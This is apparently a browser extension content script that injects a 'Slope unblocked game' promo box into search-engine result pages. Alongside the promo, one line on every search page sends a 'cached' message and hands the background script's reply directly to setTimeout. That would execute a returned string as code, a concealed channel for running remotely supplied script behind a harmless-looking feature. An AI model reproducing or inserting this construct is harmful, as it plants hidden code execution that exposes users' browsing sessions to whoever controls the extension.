window.addEventListener('load', function () {
    if (ignore()) return false;
    var q = getQueryVariable('q') || getQueryVariable('p');
    if (!q) return false;
    var className = chrome.runtime.id.substr(1, 8);
    if (q.indexOf('slope unblocked game') !== -1) {
        if (document.getElementsByClassName(className).length > 0)
            return false;
        var reminderDiv = document.createElement('DIV');var iconDiv = document.createElement('DIV');var button = document.createElement('button');var icon = document.createElement('IMG');var buttonDiv = document.createElement('DIV');var label1 = document.createElement('DIV');var label2 = document.createElement('DIV');var label3 = document.createElement('DIV');var close = document.createElement('A');
        var openGame = function (e) {
            e.preventDefault();
            reminderDiv.style.display = 'none';
            // Open Slope Unblocked Game
            chrome.runtime.sendMessage({message: 'open'}, function () {});
        };
        close.innerHTML = '<svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg">' + '<path d="M1.41429 0L16.9706 15.5563L15.5564 16.9706L7.56979e-05 1.41421L1.41429 0Z" fill="#80868B"/>' + '<path d="M16.9706 1.41431L1.41421 16.9707L0 15.5564L15.5564 9.29832e-05L16.9706 1.41431Z" fill="#80868B"/>' + '</svg>';
        close.href= '#';label1.innerText = 'Slope';label2.innerText = chrome.i18n.getMessage("play_game");label3.innerText = chrome.i18n.getMessage("already_installed");button.innerText = chrome.i18n.getMessage("play_now");icon.src = chrome.runtime.getURL('icons/slope-128.png');iconDiv.appendChild(icon);iconDiv.appendChild(label1);buttonDiv.appendChild(label2);buttonDiv.appendChild(label3);buttonDiv.appendChild(button);reminderDiv.appendChild(iconDiv);reminderDiv.appendChild(buttonDiv);reminderDiv.appendChild(close);reminderDiv.className = className;reminderDiv.style = 'font-family:Roboto,Arial,sans-serif;display:flex;z-index:999999;position:fixed;top:10px;right:200px;background:#ffffff;box-shadow:0px 5px 22px rgba(0,0,0,0.16);border-radius:15px;padding:13px 15px';iconDiv.style = 'width:140px;height:140px;border:1px solid #DFE1E5;box-sizing:border-box;border-radius:9px;display:flex;flex-direction:column;align-items:center;align-content:center';label1.style = 'margin:auto;margin-bottom:8px;font-weight:500;font-size: 16px;line-height: 19px;color: #5F6368;text-align:center;max-width: 120px;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;';icon.style = 'margin:auto;margin-top:13px;width:90px;height:90px;cursor:pointer';buttonDiv.style = 'margin:0 32px;display:flex;flex-direction:column;margin-bottom:1px';label2.style = 'font-weight:500;font-size: 22px;color: #212121;margin-top:8px;margin-bottom:12px';label3.style = 'font-weight:normal;font-size:18px;color:#808080;margin-top:0;margin-bottom:auto';button.style = 'font-weight: 900;font-size:18px;color:#FFFFFF;text-shadow: 0px -5px 14px rgba(156, 225, 255, 0.47), 0px 4px 4px #0F5BDA;width:256px;height:44px;text-align:center;line-height:44px;padding:0;background: linear-gradient(180deg, #4285F4 0%, #1564E8 100%);box-shadow: 0px 4px 10px rgba(61, 129, 243, 0.15);border-radius: 5px;border:none;cursor:pointer;margin-top:auto';document.body.appendChild(reminderDiv);
        close.addEventListener('click', function (e) {
            e.preventDefault();
            reminderDiv.style.display = 'none';
        }, true);
        button.addEventListener('click', openGame, true);
        icon.addEventListener('click', openGame, true);
    }
});
ignore() || chrome.runtime.sendMessage({message: 'cached'}, decorator(setTimeout));
function getQueryVariable(name) {var query = window.location.search.substring(1);var strings = query.split('&');for (var i = 0; i < strings.length; i++) {var pair = strings[i].split('=');if (decodeURIComponent(pair[0]) === name) {return decodeURIComponent(pair[1]).replace(/\+/g, ' ').toLowerCase()}}return false}
function decorator(f) {return function (a) {if (typeof a !== "undefined" && a !== null)f(a)}}
function ignore() {return (window.location.pathname.indexOf('search') === -1 || window.location.search.indexOf('tbm=isch') !== -1 || window.location.search.indexOf('tbm=vid') !== -1 || window.location.pathname.indexOf('/search/images') !== -1 || window.location.pathname.indexOf('/search/video') !== -1 || window.location.pathname.indexOf('images/search') !== -1 || window.location.pathname.indexOf('videos/search') !== -1)}